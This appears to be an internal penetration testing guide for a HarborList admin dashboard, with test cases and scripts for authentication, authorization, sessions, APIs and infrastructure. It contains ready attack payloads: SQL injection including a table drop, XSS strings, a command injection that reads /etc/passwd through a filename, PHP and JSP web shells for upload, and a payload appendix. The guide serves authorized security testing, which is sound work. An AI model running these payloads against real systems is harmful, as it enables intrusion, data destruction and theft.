# Admin Dashboard Penetration Testing Guide

## Overview

This guide provides comprehensive instructions for conducting penetration testing on the HarborList Admin Dashboard. It covers methodology, tools, test cases, and reporting procedures to ensure thorough security assessment.

## Table of Contents

1. [Pre-Testing Preparation](#pre-testing-preparation)
2. [Testing Methodology](#testing-methodology)
3. [Authentication Testing](#authentication-testing)
4. [Authorization Testing](#authorization-testing)
5. [Input Validation Testing](#input-validation-testing)
6. [Session Management Testing](#session-management-testing)
7. [API Security Testing](#api-security-testing)
8. [Infrastructure Testing](#infrastructure-testing)
9. [Client-Side Testing](#client-side-testing)
10. [Reporting and Documentation](#reporting-and-documentation)

## Pre-Testing Preparation

### 1.1 Scope Definition

**In-Scope Systems:**
- Admin Dashboard Web Application
- Admin API Endpoints
- Authentication Services
- Database Connections
- Supporting Infrastructure

**Out-of-Scope Systems:**
- Production User Data
- Third-Party Services
- Physical Infrastructure
- Social Engineering

### 1.2 Legal and Compliance

**Required Documentation:**
- [ ] Signed penetration testing agreement
- [ ] Rules of engagement document
- [ ] Emergency contact information
- [ ] Data handling agreement
- [ ] Compliance requirements checklist

**Legal Considerations:**
- [ ] Written authorization obtained
- [ ] Scope clearly defined and approved
- [ ] Data protection requirements understood
- [ ] Incident response procedures agreed
- [ ] Reporting requirements clarified

### 1.3 Environment Setup

**Testing Environment:**
- [ ] Dedicated testing environment available
- [ ] Test data populated (no production data)
- [ ] Monitoring and logging enabled
- [ ] Backup and recovery procedures tested
- [ ] Network isolation confirmed

**Testing Tools:**
- [ ] OWASP ZAP configured
- [ ] Burp Suite Professional licensed
- [ ] Nmap for network scanning
- [ ] SQLMap for SQL injection testing
- [ ] Custom scripts and payloads prepared

### 1.4 Test Accounts

**Admin Accounts:**
- [ ] Super Admin test account
- [ ] Regular Admin test account
- [ ] Moderator test account
- [ ] Support test account
- [ ] Disabled/locked test account

**User Accounts:**
- [ ] Regular user accounts
- [ ] Suspended user accounts
- [ ] Premium user accounts
- [ ] Unverified user accounts

## Testing Methodology

### 2.1 Testing Phases

**Phase 1: Reconnaissance (1-2 days)**
- Information gathering
- Network discovery
- Service enumeration
- Technology identification

**Phase 2: Vulnerability Assessment (2-3 days)**
- Automated scanning
- Manual testing
- Vulnerability validation
- Risk assessment

**Phase 3: Exploitation (2-3 days)**
- Proof of concept development
- Impact assessment
- Privilege escalation testing
- Data access validation

**Phase 4: Post-Exploitation (1 day)**
- Persistence testing
- Lateral movement
- Data exfiltration simulation
- Cleanup procedures

**Phase 5: Reporting (1-2 days)**
- Findings documentation
- Risk assessment
- Remediation recommendations
- Executive summary

### 2.2 Testing Standards

**OWASP Testing Guide Compliance:**
- [ ] Authentication Testing (OTG-AUTHN)
- [ ] Authorization Testing (OTG-AUTHZ)
- [ ] Session Management Testing (OTG-SESS)
- [ ] Input Validation Testing (OTG-INPVAL)
- [ ] Error Handling Testing (OTG-ERR)
- [ ] Cryptography Testing (OTG-CRYPST)
- [ ] Business Logic Testing (OTG-BUSLOGIC)
- [ ] Client Side Testing (OTG-CLIENT)

## Authentication Testing

### 3.1 Password Policy Testing

**Test Cases:**

**TC-AUTH-001: Weak Password Acceptance**
```bash
# Test weak passwords
curl -X POST https://admin.harbotlist.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "123456"
  }'
```

**Expected Result:** Login should fail with password policy error

**TC-AUTH-002: Password Complexity Bypass**
```bash
# Test various weak password patterns
passwords=("password" "admin" "123456789" "qwerty" "Password1")
for pwd in "${passwords[@]}"; do
  echo "Testing password: $pwd"
  # Test login attempt
done
```

**TC-AUTH-003: Password History Enforcement**
- Change password multiple times
- Attempt to reuse previous passwords
- Verify system prevents reuse

### 3.2 Account Lockout Testing

**TC-AUTH-004: Brute Force Protection**
```python
import requests
import time

def test_brute_force_protection():
    url = "https://admin.harbotlist.com/api/auth/login"
    
    for i in range(10):
        response = requests.post(url, json={
            "email": "admin@harbotlist.com",
            "password": f"wrongpassword{i}"
        })
        
        print(f"Attempt {i+1}: Status {response.status_code}")
        
        if response.status_code == 429:
            print("Account locked - protection working")
            break
        
        time.sleep(1)
```

**TC-AUTH-005: Account Lockout Bypass**
- Test different IP addresses
- Test different user agents
- Test distributed attacks
- Test timing-based bypasses

### 3.3 Multi-Factor Authentication Testing

**TC-AUTH-006: MFA Bypass Attempts**
```bash
# Test direct access after first factor
curl -X GET https://admin.harbotlist.com/api/admin/dashboard \
  -H "Authorization: Bearer partial_token"
```

**TC-AUTH-007: MFA Token Manipulation**
- Test TOTP token reuse
- Test backup code enumeration
- Test timing attacks on TOTP
- Test MFA device registration bypass

### 3.4 Session Fixation Testing

**TC-AUTH-008: Session Fixation Attack**
```javascript
// Pre-login session ID
const preLoginSessionId = document.cookie.match(/sessionid=([^;]+)/)[1];

// Perform login
fetch('/api/auth/login', {
  method: 'POST',
  body: JSON.stringify({email: 'admin@example.com', password: 'password'})
});

// Post-login session ID
const postLoginSessionId = document.cookie.match(/sessionid=([^;]+)/)[1];

console.log('Session changed:', preLoginSessionId !== postLoginSessionId);
```

## Authorization Testing

### 4.1 Privilege Escalation Testing

**TC-AUTHZ-001: Horizontal Privilege Escalation**
```bash
# Login as moderator
TOKEN=$(curl -X POST https://admin.harbotlist.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "moderator@example.com", "password": "password"}' \
  | jq -r '.token')

# Attempt admin-only operation
curl -X GET https://admin.harbotlist.com/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

**TC-AUTHZ-002: Vertical Privilege Escalation**
```bash
# Test accessing higher privilege functions
curl -X POST https://admin.harbotlist.com/api/admin/users/create-admin \
  -H "Authorization: Bearer $MODERATOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "newadmin@example.com", "role": "admin"}'
```

### 4.2 Direct Object Reference Testing

**TC-AUTHZ-003: Insecure Direct Object References**
```bash
# Test accessing other users' data
USER_IDS=("user-123" "user-456" "user-789")

for user_id in "${USER_IDS[@]}"; do
  echo "Testing access to user: $user_id"
  curl -X GET "https://admin.harbotlist.com/api/admin/users/$user_id" \
    -H "Authorization: Bearer $TOKEN"
done
```

**TC-AUTHZ-004: Parameter Manipulation**
```bash
# Test parameter tampering
curl -X GET "https://admin.harbotlist.com/api/admin/users?userId=admin-123" \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN"
```

### 4.3 Role-Based Access Control Testing

**TC-AUTHZ-005: Role Boundary Testing**
```python
def test_role_boundaries():
    roles = {
        'support': 'support_token',
        'moderator': 'moderator_token',
        'admin': 'admin_token'
    }
    
    endpoints = [
        '/api/admin/users',
        '/api/admin/financial',
        '/api/admin/system/config',
        '/api/admin/audit-logs'
    ]
    
    for role, token in roles.items():
        for endpoint in endpoints:
            response = requests.get(f"https://admin.harbotlist.com{endpoint}",
                                  headers={'Authorization': f'Bearer {token}'})
            print(f"{role} -> {endpoint}: {response.status_code}")
```

## Input Validation Testing

### 5.1 SQL Injection Testing

**TC-INPUT-001: SQL Injection in Search**
```bash
# Test SQL injection in user search
curl -X GET "https://admin.harbotlist.com/api/admin/users?search='; DROP TABLE users; --" \
  -H "Authorization: Bearer $TOKEN"
```

**TC-INPUT-002: Blind SQL Injection**
```python
import requests
import time

def test_blind_sql_injection():
    base_url = "https://admin.harbotlist.com/api/admin/users"
    
    # Time-based blind SQL injection
    payloads = [
        "test' AND (SELECT SLEEP(5)) --",
        "test' AND (SELECT COUNT(*) FROM users) > 0 --",
        "test' UNION SELECT NULL, NULL, SLEEP(5) --"
    ]
    
    for payload in payloads:
        start_time = time.time()
        response = requests.get(f"{base_url}?search={payload}",
                              headers={'Authorization': f'Bearer {token}'})
        end_time = time.time()
        
        if end_time - start_time > 4:
            print(f"Potential SQL injection: {payload}")
```

### 5.2 Cross-Site Scripting (XSS) Testing

**TC-INPUT-003: Stored XSS Testing**
```javascript
// Test stored XSS in user notes
const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>'
];

xssPayloads.forEach(payload => {
    fetch('/api/admin/users/user-123/notes', {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({note: payload})
    });
});
```

**TC-INPUT-004: Reflected XSS Testing**
```bash
# Test reflected XSS in error messages
curl -X GET "https://admin.harbotlist.com/api/admin/users?search=<script>alert('XSS')</script>" \
  -H "Authorization: Bearer $TOKEN"
```

### 5.3 Command Injection Testing

**TC-INPUT-005: OS Command Injection**
```bash
# Test command injection in file operations
curl -X POST https://admin.harbotlist.com/api/admin/export \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "csv",
    "filename": "users; cat /etc/passwd"
  }'
```

### 5.4 File Upload Testing

**TC-INPUT-006: Malicious File Upload**
```python
def test_malicious_file_upload():
    files = {
        'malicious.php': '<?php system($_GET["cmd"]); ?>',
        'malicious.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        'malicious.exe': b'\x4d\x5a\x90\x00',  # PE header
        'large_file.txt': 'A' * (10 * 1024 * 1024)  # 10MB file
    }
    
    for filename, content in files.items():
        response = requests.post(
            'https://admin.harbotlist.com/api/admin/upload',
            files={'file': (filename, content)},
            headers={'Authorization': f'Bearer {token}'}
        )
        print(f"{filename}: {response.status_code}")
```

## Session Management Testing

### 6.1 Session Token Testing

**TC-SESS-001: Session Token Entropy**
```python
import requests
import re

def analyze_session_tokens():
    tokens = []
    
    # Collect multiple session tokens
    for i in range(100):
        response = requests.post('/api/auth/login', json={
            'email': f'test{i}@example.com',
            'password': 'password'
        })
        
        if response.status_code == 200:
            token = response.json().get('token')
            tokens.append(token)
    
    # Analyze token patterns
    print(f"Collected {len(tokens)} tokens")
    print(f"Average length: {sum(len(t) for t in tokens) / len(tokens)}")
    
    # Check for patterns
    patterns = set()
    for token in tokens:
        # Extract potential patterns
        pattern = re.sub(r'[0-9]', 'N', token)
        pattern = re.sub(r'[a-z]', 'l', pattern)
        pattern = re.sub(r'[A-Z]', 'U', pattern)
        patterns.add(pattern)
    
    print(f"Unique patterns: {len(patterns)}")
```

**TC-SESS-002: Session Fixation**
```javascript
// Test session fixation vulnerability
function testSessionFixation() {
    // Get initial session
    const initialSession = getCookie('sessionId');
    
    // Login with fixed session
    fetch('/api/auth/login', {
        method: 'POST',
        headers: {
            'Cookie': `sessionId=${initialSession}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: 'admin@example.com',
            password: 'password'
        })
    }).then(response => {
        const newSession = getCookie('sessionId');
        console.log('Session changed:', initialSession !== newSession);
    });
}
```

### 6.2 Session Timeout Testing

**TC-SESS-003: Session Timeout Validation**
```bash
# Test session timeout
TOKEN=$(get_auth_token)

# Wait for timeout period
sleep 3600  # 1 hour

# Test if session is still valid
curl -X GET https://admin.harbotlist.com/api/admin/dashboard \
  -H "Authorization: Bearer $TOKEN"
```

**TC-SESS-004: Concurrent Session Limits**
```python
def test_concurrent_sessions():
    credentials = {
        'email': 'admin@example.com',
        'password': 'password'
    }
    
    sessions = []
    
    # Create multiple sessions
    for i in range(10):
        response = requests.post('/api/auth/login', json=credentials)
        if response.status_code == 200:
            sessions.append(response.json()['token'])
    
    print(f"Created {len(sessions)} concurrent sessions")
    
    # Test if all sessions are valid
    valid_sessions = 0
    for token in sessions:
        response = requests.get('/api/admin/dashboard',
                              headers={'Authorization': f'Bearer {token}'})
        if response.status_code == 200:
            valid_sessions += 1
    
    print(f"Valid sessions: {valid_sessions}")
```

## API Security Testing

### 7.1 REST API Testing

**TC-API-001: HTTP Method Testing**
```bash
# Test unsupported HTTP methods
METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS" "TRACE")

for method in "${METHODS[@]}"; do
  echo "Testing method: $method"
  curl -X $method https://admin.harbotlist.com/api/admin/users \
    -H "Authorization: Bearer $TOKEN"
done
```

**TC-API-002: Content-Type Manipulation**
```bash
# Test different content types
curl -X POST https://admin.harbotlist.com/api/admin/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<user><email>test@example.com</email></user>'
```

### 7.2 Rate Limiting Testing

**TC-API-003: Rate Limit Bypass**
```python
import requests
import threading
import time

def test_rate_limiting():
    def make_request():
        response = requests.get('https://admin.harbotlist.com/api/admin/users',
                              headers={'Authorization': f'Bearer {token}'})
        return response.status_code
    
    # Test rapid requests
    threads = []
    for i in range(100):
        thread = threading.Thread(target=make_request)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
```

### 7.3 API Parameter Testing

**TC-API-004: Parameter Pollution**
```bash
# Test parameter pollution
curl -X GET "https://admin.harbotlist.com/api/admin/users?page=1&page=999&limit=20&limit=1000" \
  -H "Authorization: Bearer $TOKEN"
```

**TC-API-005: Mass Assignment**
```bash
# Test mass assignment vulnerability
curl -X POST https://admin.harbotlist.com/api/admin/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "name": "Test User",
    "role": "admin",
    "permissions": ["all"],
    "isActive": true
  }'
```

## Infrastructure Testing

### 8.1 Network Security Testing

**TC-INFRA-001: Port Scanning**
```bash
# Scan for open ports
nmap -sS -O -A admin.harbotlist.com

# Scan for common vulnerabilities
nmap --script vuln admin.harbotlist.com
```

**TC-INFRA-002: SSL/TLS Testing**
```bash
# Test SSL configuration
sslscan admin.harbotlist.com

# Test for weak ciphers
nmap --script ssl-enum-ciphers -p 443 admin.harbotlist.com
```

### 8.2 Server Configuration Testing

**TC-INFRA-003: HTTP Security Headers**
```python
import requests

def test_security_headers():
    response = requests.get('https://admin.harbotlist.com')
    
    security_headers = [
        'Strict-Transport-Security',
        'Content-Security-Policy',
        'X-Frame-Options',
        'X-Content-Type-Options',
        'X-XSS-Protection',
        'Referrer-Policy'
    ]
    
    for header in security_headers:
        if header in response.headers:
            print(f"✓ {header}: {response.headers[header]}")
        else:
            print(f"✗ {header}: Missing")
```

**TC-INFRA-004: Information Disclosure**
```bash
# Test for information disclosure
curl -I https://admin.harbotlist.com
curl -X OPTIONS https://admin.harbotlist.com
curl https://admin.harbotlist.com/robots.txt
curl https://admin.harbotlist.com/.well-known/security.txt
```

## Client-Side Testing

### 9.1 Browser Security Testing

**TC-CLIENT-001: Content Security Policy**
```javascript
// Test CSP bypass
function testCSPBypass() {
    const payloads = [
        'data:text/html,<script>alert("CSP Bypass")</script>',
        'javascript:alert("CSP Bypass")',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
    ];
    
    payloads.forEach(payload => {
        try {
            eval(payload);
        } catch (e) {
            console.log('CSP blocked:', payload);
        }
    });
}
```

**TC-CLIENT-002: Local Storage Security**
```javascript
// Test sensitive data in local storage
function auditLocalStorage() {
    const sensitivePatterns = [
        /password/i,
        /token/i,
        /secret/i,
        /key/i,
        /credential/i
    ];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        sensitivePatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(value)) {
                console.warn(`Sensitive data found: ${key}`);
            }
        });
    }
}
```

### 9.2 DOM Security Testing

**TC-CLIENT-003: DOM-based XSS**
```javascript
// Test DOM-based XSS
function testDOMXSS() {
    const xssPayloads = [
        '#<script>alert("DOM XSS")</script>',
        '#<img src=x onerror=alert("DOM XSS")>',
        '#javascript:alert("DOM XSS")'
    ];
    
    xssPayloads.forEach(payload => {
        window.location.hash = payload;
        setTimeout(() => {
            console.log('Testing payload:', payload);
        }, 100);
    });
}
```

## Reporting and Documentation

### 10.1 Vulnerability Classification

**Severity Levels:**

**Critical (CVSS 9.0-10.0)**
- Remote code execution
- SQL injection with data access
- Authentication bypass
- Privilege escalation to admin

**High (CVSS 7.0-8.9)**
- Stored XSS
- Sensitive data exposure
- Authorization bypass
- Session hijacking

**Medium (CVSS 4.0-6.9)**
- Reflected XSS
- CSRF vulnerabilities
- Information disclosure
- Weak authentication

**Low (CVSS 0.1-3.9)**
- Missing security headers
- Verbose error messages
- Weak password policies
- Minor information leakage

### 10.2 Report Template

```markdown
# Penetration Testing Report
## HarborList Admin Dashboard

### Executive Summary
- **Testing Period**: [Start Date] - [End Date]
- **Tester**: [Name and Credentials]
- **Scope**: [Systems Tested]
- **Methodology**: [Testing Approach]

### Key Findings
- **Critical**: X vulnerabilities
- **High**: X vulnerabilities  
- **Medium**: X vulnerabilities
- **Low**: X vulnerabilities

### Detailed Findings

#### [VULN-001] SQL Injection in User Search
- **Severity**: Critical
- **CVSS Score**: 9.8
- **Description**: [Detailed description]
- **Impact**: [Business impact]
- **Proof of Concept**: [Steps to reproduce]
- **Remediation**: [Fix recommendations]

### Recommendations
1. [Priority 1 recommendations]
2. [Priority 2 recommendations]
3. [Priority 3 recommendations]

### Conclusion
[Overall security posture assessment]
```

### 10.3 Remediation Tracking

**Vulnerability Tracking Template:**

| ID | Vulnerability | Severity | Status | Assigned To | Due Date | Verification |
|----|---------------|----------|--------|-------------|----------|--------------|
| VULN-001 | SQL Injection | Critical | Open | Dev Team | 2024-10-15 | Pending |
| VULN-002 | XSS in Notes | High | Fixed | Dev Team | 2024-10-10 | Verified |

### 10.4 Retest Procedures

**Retest Checklist:**
- [ ] All critical vulnerabilities retested
- [ ] High severity vulnerabilities retested
- [ ] Regression testing performed
- [ ] New vulnerabilities identified
- [ ] Remediation effectiveness verified

## Appendix A: Testing Tools

### Automated Tools
- **OWASP ZAP**: Web application scanner
- **Burp Suite**: Web vulnerability scanner
- **Nessus**: Network vulnerability scanner
- **SQLMap**: SQL injection testing tool
- **Nikto**: Web server scanner

### Manual Testing Tools
- **Postman**: API testing
- **Browser Developer Tools**: Client-side testing
- **Wireshark**: Network traffic analysis
- **Nmap**: Network discovery and security auditing

### Custom Scripts
- Authentication testing scripts
- Session management testing tools
- Input validation test cases
- API security testing utilities

## Appendix B: Common Payloads

### SQL Injection Payloads
```sql
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT NULL, username, password FROM admin_users --
' AND (SELECT SLEEP(5)) --
```

### XSS Payloads
```html
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
javascript:alert('XSS')
```

### Command Injection Payloads
```bash
; cat /etc/passwd
| whoami
& ping -c 4 127.0.0.1
`id`
```

---

*Last Updated: September 28, 2024*
*Version: 1.0*